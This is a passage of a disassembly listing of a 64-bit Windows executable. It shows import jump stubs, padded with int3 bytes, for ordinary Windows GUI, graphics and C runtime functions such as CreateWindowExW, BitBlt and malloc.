   140005177:	cc                   	int3
   140005178:	cc                   	int3
   140005179:	cc                   	int3
   14000517a:	cc                   	int3
   14000517b:	cc                   	int3
   14000517c:	cc                   	int3
   14000517d:	cc                   	int3
   14000517e:	cc                   	int3
   14000517f:	cc                   	int3
   140005180:	ff 25 fa 28 07 00    	jmp    *0x728fa(%rip)        # 140077a80 <__imp_WriteFile>
   140005186:	cc                   	int3
   140005187:	cc                   	int3
   140005188:	cc                   	int3
   140005189:	cc                   	int3
   14000518a:	cc                   	int3
   14000518b:	cc                   	int3
   14000518c:	cc                   	int3
   14000518d:	cc                   	int3
   14000518e:	cc                   	int3
   14000518f:	cc                   	int3
   140005190:	ff 25 fa 28 07 00    	jmp    *0x728fa(%rip)        # 140077a90 <__imp_lstrcatW>
   140005196:	cc                   	int3
   140005197:	cc                   	int3
   140005198:	cc                   	int3
   140005199:	cc                   	int3
   14000519a:	cc                   	int3
   14000519b:	cc                   	int3
   14000519c:	cc                   	int3
   14000519d:	cc                   	int3
   14000519e:	cc                   	int3
   14000519f:	cc                   	int3
   1400051a0:	ff 25 fa 28 07 00    	jmp    *0x728fa(%rip)        # 140077aa0 <__imp_BeginPaint>
   1400051a6:	cc                   	int3
   1400051a7:	cc                   	int3
   1400051a8:	cc                   	int3
   1400051a9:	cc                   	int3
   1400051aa:	cc                   	int3
   1400051ab:	cc                   	int3
   1400051ac:	cc                   	int3
   1400051ad:	cc                   	int3
   1400051ae:	cc                   	int3
   1400051af:	cc                   	int3
   1400051b0:	ff 25 f2 28 07 00    	jmp    *0x728f2(%rip)        # 140077aa8 <__imp_CreateWindowExW>
   1400051b6:	cc                   	int3
   1400051b7:	cc                   	int3
   1400051b8:	cc                   	int3
   1400051b9:	cc                   	int3
   1400051ba:	cc                   	int3
   1400051bb:	cc                   	int3
   1400051bc:	cc                   	int3
   1400051bd:	cc                   	int3
   1400051be:	cc                   	int3
   1400051bf:	cc                   	int3
   1400051c0:	ff 25 ea 28 07 00    	jmp    *0x728ea(%rip)        # 140077ab0 <__imp_DefWindowProcW>
   1400051c6:	cc                   	int3
   1400051c7:	cc                   	int3
   1400051c8:	cc                   	int3
   1400051c9:	cc                   	int3
   1400051ca:	cc                   	int3
   1400051cb:	cc                   	int3
   1400051cc:	cc                   	int3
   1400051cd:	cc                   	int3
   1400051ce:	cc                   	int3
   1400051cf:	cc                   	int3
   1400051d0:	ff 25 e2 28 07 00    	jmp    *0x728e2(%rip)        # 140077ab8 <__imp_DestroyIcon>
   1400051d6:	cc                   	int3
   1400051d7:	cc                   	int3
   1400051d8:	cc                   	int3
   1400051d9:	cc                   	int3
   1400051da:	cc                   	int3
   1400051db:	cc                   	int3
   1400051dc:	cc                   	int3
   1400051dd:	cc                   	int3
   1400051de:	cc                   	int3
   1400051df:	cc                   	int3
   1400051e0:	ff 25 da 28 07 00    	jmp    *0x728da(%rip)        # 140077ac0 <__imp_DestroyWindow>
   1400051e6:	cc                   	int3
   1400051e7:	cc                   	int3
   1400051e8:	cc                   	int3
   1400051e9:	cc                   	int3
   1400051ea:	cc                   	int3
   1400051eb:	cc                   	int3
   1400051ec:	cc                   	int3
   1400051ed:	cc                   	int3
   1400051ee:	cc                   	int3
   1400051ef:	cc                   	int3
   1400051f0:	ff 25 d2 28 07 00    	jmp    *0x728d2(%rip)        # 140077ac8 <__imp_DispatchMessageW>
   1400051f6:	cc                   	int3
   1400051f7:	cc                   	int3
   1400051f8:	cc                   	int3
   1400051f9:	cc                   	int3
   1400051fa:	cc                   	int3
   1400051fb:	cc                   	int3
   1400051fc:	cc                   	int3
   1400051fd:	cc                   	int3
   1400051fe:	cc                   	int3
   1400051ff:	cc                   	int3
   140005200:	ff 25 ca 28 07 00    	jmp    *0x728ca(%rip)        # 140077ad0 <__imp_DrawTextW>
   140005206:	cc                   	int3
   140005207:	cc                   	int3
   140005208:	cc                   	int3
   140005209:	cc                   	int3
   14000520a:	cc                   	int3
   14000520b:	cc                   	int3
   14000520c:	cc                   	int3
   14000520d:	cc                   	int3
   14000520e:	cc                   	int3
   14000520f:	cc                   	int3
   140005210:	ff 25 c2 28 07 00    	jmp    *0x728c2(%rip)        # 140077ad8 <__imp_EndPaint>
   140005216:	cc                   	int3
   140005217:	cc                   	int3
   140005218:	cc                   	int3
   140005219:	cc                   	int3
   14000521a:	cc                   	int3
   14000521b:	cc                   	int3
   14000521c:	cc                   	int3
   14000521d:	cc                   	int3
   14000521e:	cc                   	int3
   14000521f:	cc                   	int3
   140005220:	ff 25 ba 28 07 00    	jmp    *0x728ba(%rip)        # 140077ae0 <__imp_FillRect>
   140005226:	cc                   	int3
   140005227:	cc                   	int3
   140005228:	cc                   	int3
   140005229:	cc                   	int3
   14000522a:	cc                   	int3
   14000522b:	cc                   	int3
   14000522c:	cc                   	int3
   14000522d:	cc                   	int3
   14000522e:	cc                   	int3
   14000522f:	cc                   	int3
   140005230:	ff 25 b2 28 07 00    	jmp    *0x728b2(%rip)        # 140077ae8 <__imp_GetClientRect>
   140005236:	cc                   	int3
   140005237:	cc                   	int3
   140005238:	cc                   	int3
   140005239:	cc                   	int3
   14000523a:	cc                   	int3
   14000523b:	cc                   	int3
   14000523c:	cc                   	int3
   14000523d:	cc                   	int3
   14000523e:	cc                   	int3
   14000523f:	cc                   	int3
   140005240:	ff 25 aa 28 07 00    	jmp    *0x728aa(%rip)        # 140077af0 <__imp_GetCursorPos>
   140005246:	cc                   	int3
   140005247:	cc                   	int3
   140005248:	cc                   	int3
   140005249:	cc                   	int3
   14000524a:	cc                   	int3
   14000524b:	cc                   	int3
   14000524c:	cc                   	int3
   14000524d:	cc                   	int3
   14000524e:	cc                   	int3
   14000524f:	cc                   	int3
   140005250:	ff 25 a2 28 07 00    	jmp    *0x728a2(%rip)        # 140077af8 <__imp_GetDC>
   140005256:	cc                   	int3
   140005257:	cc                   	int3
   140005258:	cc                   	int3
   140005259:	cc                   	int3
   14000525a:	cc                   	int3
   14000525b:	cc                   	int3
   14000525c:	cc                   	int3
   14000525d:	cc                   	int3
   14000525e:	cc                   	int3
   14000525f:	cc                   	int3
   140005260:	ff 25 9a 28 07 00    	jmp    *0x7289a(%rip)        # 140077b00 <__imp_GetMessageW>
   140005266:	cc                   	int3
   140005267:	cc                   	int3
   140005268:	cc                   	int3
   140005269:	cc                   	int3
   14000526a:	cc                   	int3
   14000526b:	cc                   	int3
   14000526c:	cc                   	int3
   14000526d:	cc                   	int3
   14000526e:	cc                   	int3
   14000526f:	cc                   	int3
   140005270:	ff 25 92 28 07 00    	jmp    *0x72892(%rip)        # 140077b08 <__imp_GetSystemMetrics>
   140005276:	cc                   	int3
   140005277:	cc                   	int3
   140005278:	cc                   	int3
   140005279:	cc                   	int3
   14000527a:	cc                   	int3
   14000527b:	cc                   	int3
   14000527c:	cc                   	int3
   14000527d:	cc                   	int3
   14000527e:	cc                   	int3
   14000527f:	cc                   	int3
   140005280:	ff 25 8a 28 07 00    	jmp    *0x7288a(%rip)        # 140077b10 <__imp_GetWindowRect>
   140005286:	cc                   	int3
   140005287:	cc                   	int3
   140005288:	cc                   	int3
   140005289:	cc                   	int3
   14000528a:	cc                   	int3
   14000528b:	cc                   	int3
   14000528c:	cc                   	int3
   14000528d:	cc                   	int3
   14000528e:	cc                   	int3
   14000528f:	cc                   	int3
   140005290:	ff 25 82 28 07 00    	jmp    *0x72882(%rip)        # 140077b18 <__imp_InvalidateRect>
   140005296:	cc                   	int3
   140005297:	cc                   	int3
   140005298:	cc                   	int3
   140005299:	cc                   	int3
   14000529a:	cc                   	int3
   14000529b:	cc                   	int3
   14000529c:	cc                   	int3
   14000529d:	cc                   	int3
   14000529e:	cc                   	int3
   14000529f:	cc                   	int3
   1400052a0:	ff 25 7a 28 07 00    	jmp    *0x7287a(%rip)        # 140077b20 <__imp_IsWindow>
   1400052a6:	cc                   	int3
   1400052a7:	cc                   	int3
   1400052a8:	cc                   	int3
   1400052a9:	cc                   	int3
   1400052aa:	cc                   	int3
   1400052ab:	cc                   	int3
   1400052ac:	cc                   	int3
   1400052ad:	cc                   	int3
   1400052ae:	cc                   	int3
   1400052af:	cc                   	int3
   1400052b0:	ff 25 72 28 07 00    	jmp    *0x72872(%rip)        # 140077b28 <__imp_KillTimer>
   1400052b6:	cc                   	int3
   1400052b7:	cc                   	int3
   1400052b8:	cc                   	int3
   1400052b9:	cc                   	int3
   1400052ba:	cc                   	int3
   1400052bb:	cc                   	int3
   1400052bc:	cc                   	int3
   1400052bd:	cc                   	int3
   1400052be:	cc                   	int3
   1400052bf:	cc                   	int3
   1400052c0:	ff 25 6a 28 07 00    	jmp    *0x7286a(%rip)        # 140077b30 <__imp_LoadCursorW>
   1400052c6:	cc                   	int3
   1400052c7:	cc                   	int3
   1400052c8:	cc                   	int3
   1400052c9:	cc                   	int3
   1400052ca:	cc                   	int3
   1400052cb:	cc                   	int3
   1400052cc:	cc                   	int3
   1400052cd:	cc                   	int3
   1400052ce:	cc                   	int3
   1400052cf:	cc                   	int3
   1400052d0:	ff 25 62 28 07 00    	jmp    *0x72862(%rip)        # 140077b38 <__imp_LoadImageW>
   1400052d6:	cc                   	int3
   1400052d7:	cc                   	int3
   1400052d8:	cc                   	int3
   1400052d9:	cc                   	int3
   1400052da:	cc                   	int3
   1400052db:	cc                   	int3
   1400052dc:	cc                   	int3
   1400052dd:	cc                   	int3
   1400052de:	cc                   	int3
   1400052df:	cc                   	int3
   1400052e0:	ff 25 5a 28 07 00    	jmp    *0x7285a(%rip)        # 140077b40 <__imp_MessageBoxW>
   1400052e6:	cc                   	int3
   1400052e7:	cc                   	int3
   1400052e8:	cc                   	int3
   1400052e9:	cc                   	int3
   1400052ea:	cc                   	int3
   1400052eb:	cc                   	int3
   1400052ec:	cc                   	int3
   1400052ed:	cc                   	int3
   1400052ee:	cc                   	int3
   1400052ef:	cc                   	int3
   1400052f0:	ff 25 52 28 07 00    	jmp    *0x72852(%rip)        # 140077b48 <__imp_PostQuitMessage>
   1400052f6:	cc                   	int3
   1400052f7:	cc                   	int3
   1400052f8:	cc                   	int3
   1400052f9:	cc                   	int3
   1400052fa:	cc                   	int3
   1400052fb:	cc                   	int3
   1400052fc:	cc                   	int3
   1400052fd:	cc                   	int3
   1400052fe:	cc                   	int3
   1400052ff:	cc                   	int3
   140005300:	ff 25 4a 28 07 00    	jmp    *0x7284a(%rip)        # 140077b50 <__imp_PtInRect>
   140005306:	cc                   	int3
   140005307:	cc                   	int3
   140005308:	cc                   	int3
   140005309:	cc                   	int3
   14000530a:	cc                   	int3
   14000530b:	cc                   	int3
   14000530c:	cc                   	int3
   14000530d:	cc                   	int3
   14000530e:	cc                   	int3
   14000530f:	cc                   	int3
   140005310:	ff 25 42 28 07 00    	jmp    *0x72842(%rip)        # 140077b58 <__imp_RegisterClassExW>
   140005316:	cc                   	int3
   140005317:	cc                   	int3
   140005318:	cc                   	int3
   140005319:	cc                   	int3
   14000531a:	cc                   	int3
   14000531b:	cc                   	int3
   14000531c:	cc                   	int3
   14000531d:	cc                   	int3
   14000531e:	cc                   	int3
   14000531f:	cc                   	int3
   140005320:	ff 25 3a 28 07 00    	jmp    *0x7283a(%rip)        # 140077b60 <__imp_ReleaseCapture>
   140005326:	cc                   	int3
   140005327:	cc                   	int3
   140005328:	cc                   	int3
   140005329:	cc                   	int3
   14000532a:	cc                   	int3
   14000532b:	cc                   	int3
   14000532c:	cc                   	int3
   14000532d:	cc                   	int3
   14000532e:	cc                   	int3
   14000532f:	cc                   	int3
   140005330:	ff 25 32 28 07 00    	jmp    *0x72832(%rip)        # 140077b68 <__imp_ReleaseDC>
   140005336:	cc                   	int3
   140005337:	cc                   	int3
   140005338:	cc                   	int3
   140005339:	cc                   	int3
   14000533a:	cc                   	int3
   14000533b:	cc                   	int3
   14000533c:	cc                   	int3
   14000533d:	cc                   	int3
   14000533e:	cc                   	int3
   14000533f:	cc                   	int3
   140005340:	ff 25 2a 28 07 00    	jmp    *0x7282a(%rip)        # 140077b70 <__imp_ScreenToClient>
   140005346:	cc                   	int3
   140005347:	cc                   	int3
   140005348:	cc                   	int3
   140005349:	cc                   	int3
   14000534a:	cc                   	int3
   14000534b:	cc                   	int3
   14000534c:	cc                   	int3
   14000534d:	cc                   	int3
   14000534e:	cc                   	int3
   14000534f:	cc                   	int3
   140005350:	ff 25 22 28 07 00    	jmp    *0x72822(%rip)        # 140077b78 <__imp_SendMessageW>
   140005356:	cc                   	int3
   140005357:	cc                   	int3
   140005358:	cc                   	int3
   140005359:	cc                   	int3
   14000535a:	cc                   	int3
   14000535b:	cc                   	int3
   14000535c:	cc                   	int3
   14000535d:	cc                   	int3
   14000535e:	cc                   	int3
   14000535f:	cc                   	int3
   140005360:	ff 25 1a 28 07 00    	jmp    *0x7281a(%rip)        # 140077b80 <__imp_SetCursor>
   140005366:	cc                   	int3
   140005367:	cc                   	int3
   140005368:	cc                   	int3
   140005369:	cc                   	int3
   14000536a:	cc                   	int3
   14000536b:	cc                   	int3
   14000536c:	cc                   	int3
   14000536d:	cc                   	int3
   14000536e:	cc                   	int3
   14000536f:	cc                   	int3
   140005370:	ff 25 12 28 07 00    	jmp    *0x72812(%rip)        # 140077b88 <__imp_SetForegroundWindow>
   140005376:	cc                   	int3
   140005377:	cc                   	int3
   140005378:	cc                   	int3
   140005379:	cc                   	int3
   14000537a:	cc                   	int3
   14000537b:	cc                   	int3
   14000537c:	cc                   	int3
   14000537d:	cc                   	int3
   14000537e:	cc                   	int3
   14000537f:	cc                   	int3
   140005380:	ff 25 0a 28 07 00    	jmp    *0x7280a(%rip)        # 140077b90 <__imp_SetTimer>
   140005386:	cc                   	int3
   140005387:	cc                   	int3
   140005388:	cc                   	int3
   140005389:	cc                   	int3
   14000538a:	cc                   	int3
   14000538b:	cc                   	int3
   14000538c:	cc                   	int3
   14000538d:	cc                   	int3
   14000538e:	cc                   	int3
   14000538f:	cc                   	int3
   140005390:	ff 25 02 28 07 00    	jmp    *0x72802(%rip)        # 140077b98 <__imp_ShowWindow>
   140005396:	cc                   	int3
   140005397:	cc                   	int3
   140005398:	cc                   	int3
   140005399:	cc                   	int3
   14000539a:	cc                   	int3
   14000539b:	cc                   	int3
   14000539c:	cc                   	int3
   14000539d:	cc                   	int3
   14000539e:	cc                   	int3
   14000539f:	cc                   	int3
   1400053a0:	ff 25 fa 27 07 00    	jmp    *0x727fa(%rip)        # 140077ba0 <__imp_TrackMouseEvent>
   1400053a6:	cc                   	int3
   1400053a7:	cc                   	int3
   1400053a8:	cc                   	int3
   1400053a9:	cc                   	int3
   1400053aa:	cc                   	int3
   1400053ab:	cc                   	int3
   1400053ac:	cc                   	int3
   1400053ad:	cc                   	int3
   1400053ae:	cc                   	int3
   1400053af:	cc                   	int3
   1400053b0:	ff 25 f2 27 07 00    	jmp    *0x727f2(%rip)        # 140077ba8 <__imp_TranslateMessage>
   1400053b6:	cc                   	int3
   1400053b7:	cc                   	int3
   1400053b8:	cc                   	int3
   1400053b9:	cc                   	int3
   1400053ba:	cc                   	int3
   1400053bb:	cc                   	int3
   1400053bc:	cc                   	int3
   1400053bd:	cc                   	int3
   1400053be:	cc                   	int3
   1400053bf:	cc                   	int3
   1400053c0:	ff 25 ea 27 07 00    	jmp    *0x727ea(%rip)        # 140077bb0 <__imp_UpdateWindow>
   1400053c6:	cc                   	int3
   1400053c7:	cc                   	int3
   1400053c8:	cc                   	int3
   1400053c9:	cc                   	int3
   1400053ca:	cc                   	int3
   1400053cb:	cc                   	int3
   1400053cc:	cc                   	int3
   1400053cd:	cc                   	int3
   1400053ce:	cc                   	int3
   1400053cf:	cc                   	int3
   1400053d0:	ff 25 e2 27 07 00    	jmp    *0x727e2(%rip)        # 140077bb8 <__imp_wsprintfW>
   1400053d6:	cc                   	int3
   1400053d7:	cc                   	int3
   1400053d8:	cc                   	int3
   1400053d9:	cc                   	int3
   1400053da:	cc                   	int3
   1400053db:	cc                   	int3
   1400053dc:	cc                   	int3
   1400053dd:	cc                   	int3
   1400053de:	cc                   	int3
   1400053df:	cc                   	int3
   1400053e0:	ff 25 e2 27 07 00    	jmp    *0x727e2(%rip)        # 140077bc8 <__imp_BitBlt>
   1400053e6:	cc                   	int3
   1400053e7:	cc                   	int3
   1400053e8:	cc                   	int3
   1400053e9:	cc                   	int3
   1400053ea:	cc                   	int3
   1400053eb:	cc                   	int3
   1400053ec:	cc                   	int3
   1400053ed:	cc                   	int3
   1400053ee:	cc                   	int3
   1400053ef:	cc                   	int3
   1400053f0:	ff 25 da 27 07 00    	jmp    *0x727da(%rip)        # 140077bd0 <__imp_CreateCompatibleBitmap>
   1400053f6:	cc                   	int3
   1400053f7:	cc                   	int3
   1400053f8:	cc                   	int3
   1400053f9:	cc                   	int3
   1400053fa:	cc                   	int3
   1400053fb:	cc                   	int3
   1400053fc:	cc                   	int3
   1400053fd:	cc                   	int3
   1400053fe:	cc                   	int3
   1400053ff:	cc                   	int3
   140005400:	ff 25 d2 27 07 00    	jmp    *0x727d2(%rip)        # 140077bd8 <__imp_CreateCompatibleDC>
   140005406:	cc                   	int3
   140005407:	cc                   	int3
   140005408:	cc                   	int3
   140005409:	cc                   	int3
   14000540a:	cc                   	int3
   14000540b:	cc                   	int3
   14000540c:	cc                   	int3
   14000540d:	cc                   	int3
   14000540e:	cc                   	int3
   14000540f:	cc                   	int3
   140005410:	ff 25 ca 27 07 00    	jmp    *0x727ca(%rip)        # 140077be0 <__imp_CreateDIBSection>
   140005416:	cc                   	int3
   140005417:	cc                   	int3
   140005418:	cc                   	int3
   140005419:	cc                   	int3
   14000541a:	cc                   	int3
   14000541b:	cc                   	int3
   14000541c:	cc                   	int3
   14000541d:	cc                   	int3
   14000541e:	cc                   	int3
   14000541f:	cc                   	int3
   140005420:	ff 25 c2 27 07 00    	jmp    *0x727c2(%rip)        # 140077be8 <__imp_CreateFontW>
   140005426:	cc                   	int3
   140005427:	cc                   	int3
   140005428:	cc                   	int3
   140005429:	cc                   	int3
   14000542a:	cc                   	int3
   14000542b:	cc                   	int3
   14000542c:	cc                   	int3
   14000542d:	cc                   	int3
   14000542e:	cc                   	int3
   14000542f:	cc                   	int3
   140005430:	ff 25 ba 27 07 00    	jmp    *0x727ba(%rip)        # 140077bf0 <__imp_CreatePen>
   140005436:	cc                   	int3
   140005437:	cc                   	int3
   140005438:	cc                   	int3
   140005439:	cc                   	int3
   14000543a:	cc                   	int3
   14000543b:	cc                   	int3
   14000543c:	cc                   	int3
   14000543d:	cc                   	int3
   14000543e:	cc                   	int3
   14000543f:	cc                   	int3
   140005440:	ff 25 b2 27 07 00    	jmp    *0x727b2(%rip)        # 140077bf8 <__imp_CreateRoundRectRgn>
   140005446:	cc                   	int3
   140005447:	cc                   	int3
   140005448:	cc                   	int3
   140005449:	cc                   	int3
   14000544a:	cc                   	int3
   14000544b:	cc                   	int3
   14000544c:	cc                   	int3
   14000544d:	cc                   	int3
   14000544e:	cc                   	int3
   14000544f:	cc                   	int3
   140005450:	ff 25 aa 27 07 00    	jmp    *0x727aa(%rip)        # 140077c00 <__imp_CreateSolidBrush>
   140005456:	cc                   	int3
   140005457:	cc                   	int3
   140005458:	cc                   	int3
   140005459:	cc                   	int3
   14000545a:	cc                   	int3
   14000545b:	cc                   	int3
   14000545c:	cc                   	int3
   14000545d:	cc                   	int3
   14000545e:	cc                   	int3
   14000545f:	cc                   	int3
   140005460:	ff 25 a2 27 07 00    	jmp    *0x727a2(%rip)        # 140077c08 <__imp_DeleteDC>
   140005466:	cc                   	int3
   140005467:	cc                   	int3
   140005468:	cc                   	int3
   140005469:	cc                   	int3
   14000546a:	cc                   	int3
   14000546b:	cc                   	int3
   14000546c:	cc                   	int3
   14000546d:	cc                   	int3
   14000546e:	cc                   	int3
   14000546f:	cc                   	int3
   140005470:	ff 25 9a 27 07 00    	jmp    *0x7279a(%rip)        # 140077c10 <__imp_DeleteObject>
   140005476:	cc                   	int3
   140005477:	cc                   	int3
   140005478:	cc                   	int3
   140005479:	cc                   	int3
   14000547a:	cc                   	int3
   14000547b:	cc                   	int3
   14000547c:	cc                   	int3
   14000547d:	cc                   	int3
   14000547e:	cc                   	int3
   14000547f:	cc                   	int3
   140005480:	ff 25 92 27 07 00    	jmp    *0x72792(%rip)        # 140077c18 <__imp_GetDeviceCaps>
   140005486:	cc                   	int3
   140005487:	cc                   	int3
   140005488:	cc                   	int3
   140005489:	cc                   	int3
   14000548a:	cc                   	int3
   14000548b:	cc                   	int3
   14000548c:	cc                   	int3
   14000548d:	cc                   	int3
   14000548e:	cc                   	int3
   14000548f:	cc                   	int3
   140005490:	ff 25 8a 27 07 00    	jmp    *0x7278a(%rip)        # 140077c20 <__imp_LineTo>
   140005496:	cc                   	int3
   140005497:	cc                   	int3
   140005498:	cc                   	int3
   140005499:	cc                   	int3
   14000549a:	cc                   	int3
   14000549b:	cc                   	int3
   14000549c:	cc                   	int3
   14000549d:	cc                   	int3
   14000549e:	cc                   	int3
   14000549f:	cc                   	int3
   1400054a0:	ff 25 82 27 07 00    	jmp    *0x72782(%rip)        # 140077c28 <__imp_MoveToEx>
   1400054a6:	cc                   	int3
   1400054a7:	cc                   	int3
   1400054a8:	cc                   	int3
   1400054a9:	cc                   	int3
   1400054aa:	cc                   	int3
   1400054ab:	cc                   	int3
   1400054ac:	cc                   	int3
   1400054ad:	cc                   	int3
   1400054ae:	cc                   	int3
   1400054af:	cc                   	int3
   1400054b0:	ff 25 7a 27 07 00    	jmp    *0x7277a(%rip)        # 140077c30 <__imp_SelectClipRgn>
   1400054b6:	cc                   	int3
   1400054b7:	cc                   	int3
   1400054b8:	cc                   	int3
   1400054b9:	cc                   	int3
   1400054ba:	cc                   	int3
   1400054bb:	cc                   	int3
   1400054bc:	cc                   	int3
   1400054bd:	cc                   	int3
   1400054be:	cc                   	int3
   1400054bf:	cc                   	int3
   1400054c0:	ff 25 72 27 07 00    	jmp    *0x72772(%rip)        # 140077c38 <__imp_SelectObject>
   1400054c6:	cc                   	int3
   1400054c7:	cc                   	int3
   1400054c8:	cc                   	int3
   1400054c9:	cc                   	int3
   1400054ca:	cc                   	int3
   1400054cb:	cc                   	int3
   1400054cc:	cc                   	int3
   1400054cd:	cc                   	int3
   1400054ce:	cc                   	int3
   1400054cf:	cc                   	int3
   1400054d0:	ff 25 6a 27 07 00    	jmp    *0x7276a(%rip)        # 140077c40 <__imp_SetBkMode>
   1400054d6:	cc                   	int3
   1400054d7:	cc                   	int3
   1400054d8:	cc                   	int3
   1400054d9:	cc                   	int3
   1400054da:	cc                   	int3
   1400054db:	cc                   	int3
   1400054dc:	cc                   	int3
   1400054dd:	cc                   	int3
   1400054de:	cc                   	int3
   1400054df:	cc                   	int3
   1400054e0:	ff 25 62 27 07 00    	jmp    *0x72762(%rip)        # 140077c48 <__imp_SetTextColor>
   1400054e6:	cc                   	int3
   1400054e7:	cc                   	int3
   1400054e8:	cc                   	int3
   1400054e9:	cc                   	int3
   1400054ea:	cc                   	int3
   1400054eb:	cc                   	int3
   1400054ec:	cc                   	int3
   1400054ed:	cc                   	int3
   1400054ee:	cc                   	int3
   1400054ef:	cc                   	int3
   1400054f0:	ff 25 5a 27 07 00    	jmp    *0x7275a(%rip)        # 140077c50 <__imp_StretchBlt>
   1400054f6:	cc                   	int3
   1400054f7:	cc                   	int3
   1400054f8:	cc                   	int3
   1400054f9:	cc                   	int3
   1400054fa:	cc                   	int3
   1400054fb:	cc                   	int3
   1400054fc:	cc                   	int3
   1400054fd:	cc                   	int3
   1400054fe:	cc                   	int3
   1400054ff:	cc                   	int3

0000000140005500 <__p__commode>:
   140005500:	ff 25 62 27 07 00    	jmp    *0x72762(%rip)        # 140077c68 <__imp___p__commode>
   140005506:	cc                   	int3
   140005507:	cc                   	int3
   140005508:	cc                   	int3
   140005509:	cc                   	int3
   14000550a:	cc                   	int3
   14000550b:	cc                   	int3
   14000550c:	cc                   	int3
   14000550d:	cc                   	int3
   14000550e:	cc                   	int3
   14000550f:	cc                   	int3

0000000140005510 <__p__fmode>:
   140005510:	ff 25 5a 27 07 00    	jmp    *0x7275a(%rip)        # 140077c70 <__imp___p__fmode>
   140005516:	cc                   	int3
   140005517:	cc                   	int3
   140005518:	cc                   	int3
   140005519:	cc                   	int3
   14000551a:	cc                   	int3
   14000551b:	cc                   	int3
   14000551c:	cc                   	int3
   14000551d:	cc                   	int3
   14000551e:	cc                   	int3
   14000551f:	cc                   	int3

0000000140005520 <_cexit>:
   140005520:	ff 25 7a 27 07 00    	jmp    *0x7277a(%rip)        # 140077ca0 <__imp__cexit>
   140005526:	cc                   	int3
   140005527:	cc                   	int3
   140005528:	cc                   	int3
   140005529:	cc                   	int3
   14000552a:	cc                   	int3
   14000552b:	cc                   	int3
   14000552c:	cc                   	int3
   14000552d:	cc                   	int3
   14000552e:	cc                   	int3
   14000552f:	cc                   	int3

0000000140005530 <_configthreadlocale>:
   140005530:	ff 25 d2 27 07 00    	jmp    *0x727d2(%rip)        # 140077d08 <__imp__configthreadlocale>
   140005536:	cc                   	int3
   140005537:	cc                   	int3
   140005538:	cc                   	int3
   140005539:	cc                   	int3
   14000553a:	cc                   	int3
   14000553b:	cc                   	int3
   14000553c:	cc                   	int3
   14000553d:	cc                   	int3
   14000553e:	cc                   	int3
   14000553f:	cc                   	int3

0000000140005540 <_crt_atexit>:
   140005540:	ff 25 6a 27 07 00    	jmp    *0x7276a(%rip)        # 140077cb0 <__imp__crt_atexit>
   140005546:	cc                   	int3
   140005547:	cc                   	int3
   140005548:	cc                   	int3
   140005549:	cc                   	int3
   14000554a:	cc                   	int3
   14000554b:	cc                   	int3
   14000554c:	cc                   	int3
   14000554d:	cc                   	int3
   14000554e:	cc                   	int3
   14000554f:	cc                   	int3

0000000140005550 <_initterm>:
   140005550:	ff 25 72 27 07 00    	jmp    *0x72772(%rip)        # 140077cc8 <__imp__initterm>
   140005556:	cc                   	int3
   140005557:	cc                   	int3
   140005558:	cc                   	int3
   140005559:	cc                   	int3
   14000555a:	cc                   	int3
   14000555b:	cc                   	int3
   14000555c:	cc                   	int3
   14000555d:	cc                   	int3
   14000555e:	cc                   	int3
   14000555f:	cc                   	int3

0000000140005560 <_initterm_e>:
   140005560:	ff 25 6a 27 07 00    	jmp    *0x7276a(%rip)        # 140077cd0 <__imp__initterm_e>
   140005566:	cc                   	int3
   140005567:	cc                   	int3
   140005568:	cc                   	int3
   140005569:	cc                   	int3
   14000556a:	cc                   	int3
   14000556b:	cc                   	int3
   14000556c:	cc                   	int3
   14000556d:	cc                   	int3
   14000556e:	cc                   	int3
   14000556f:	cc                   	int3

0000000140005570 <_set_invalid_parameter_handler>:
   140005570:	ff 25 6a 27 07 00    	jmp    *0x7276a(%rip)        # 140077ce0 <__imp__set_invalid_parameter_handler>
   140005576:	cc                   	int3
   140005577:	cc                   	int3
   140005578:	cc                   	int3
   140005579:	cc                   	int3
   14000557a:	cc                   	int3
   14000557b:	cc                   	int3
   14000557c:	cc                   	int3
   14000557d:	cc                   	int3
   14000557e:	cc                   	int3
   14000557f:	cc                   	int3

0000000140005580 <exit>:
   140005580:	ff 25 6a 27 07 00    	jmp    *0x7276a(%rip)        # 140077cf0 <__imp_exit>
   140005586:	cc                   	int3
   140005587:	cc                   	int3
   140005588:	cc                   	int3
   140005589:	cc                   	int3
   14000558a:	cc                   	int3
   14000558b:	cc                   	int3
   14000558c:	cc                   	int3
   14000558d:	cc                   	int3
   14000558e:	cc                   	int3
   14000558f:	cc                   	int3

0000000140005590 <malloc>:
   140005590:	ff 25 9a 27 07 00    	jmp    *0x7279a(%rip)        # 140077d30 <__imp_malloc>
   140005596:	cc                   	int3
   140005597:	cc                   	int3
   140005598:	cc                   	int3
   140005599:	cc                   	int3
   14000559a:	cc                   	int3
   14000559b:	cc                   	int3
   14000559c:	cc                   	int3
   14000559d:	cc                   	int3
   14000559e:	cc                   	int3
   14000559f:	cc                   	int3

00000001400055a0 <memcpy>:
   1400055a0:	ff 25 9a 27 07 00    	jmp    *0x7279a(%rip)        # 140077d40 <__imp_memcpy>
   1400055a6:	cc                   	int3
   1400055a7:	cc                   	int3
   1400055a8:	cc                   	int3
   1400055a9:	cc                   	int3
   1400055aa:	cc                   	int3
   1400055ab:	cc                   	int3
   1400055ac:	cc                   	int3
   1400055ad:	cc                   	int3
   1400055ae:	cc                   	int3
   1400055af:	cc                   	int3

00000001400055b0 <wcscmp>:
   1400055b0:	ff 25 b2 27 07 00    	jmp    *0x727b2(%rip)        # 140077d68 <__imp_wcscmp>
   1400055b6:	cc                   	int3
   1400055b7:	cc                   	int3
   1400055b8:	cc                   	int3
   1400055b9:	cc                   	int3
   1400055ba:	cc                   	int3
   1400055bb:	cc                   	int3
   1400055bc:	cc                   	int3
   1400055bd:	cc                   	int3
   1400055be:	cc                   	int3
   1400055bf:	cc                   	int3

00000001400055c0 <wcslen>:
   1400055c0:	ff 25 aa 27 07 00    	jmp    *0x727aa(%rip)        # 140077d70 <__imp_wcslen>
   1400055c6:	cc                   	int3
   1400055c7:	cc                   	int3
   1400055c8:	cc                   	int3
   1400055c9:	cc                   	int3
   1400055ca:	cc                   	int3
   1400055cb:	cc                   	int3
   1400055cc:	cc                   	int3
   1400055cd:	cc                   	int3
   1400055ce:	cc                   	int3
   1400055cf:	cc                   	int3

00000001400055d0 <wcsstr>:
   1400055d0:	ff 25 72 27 07 00    	jmp    *0x72772(%rip)        # 140077d48 <__imp_wcsstr>
   1400055d6:	cc                   	int3
   1400055d7:	cc                   	int3
   1400055d8:	cc                   	int3
   1400055d9:	cc                   	int3
   1400055da:	cc                   	int3
   1400055db:	cc                   	int3
   1400055dc:	cc                   	int3
   1400055dd:	cc                   	int3
   1400055de:	cc                   	int3
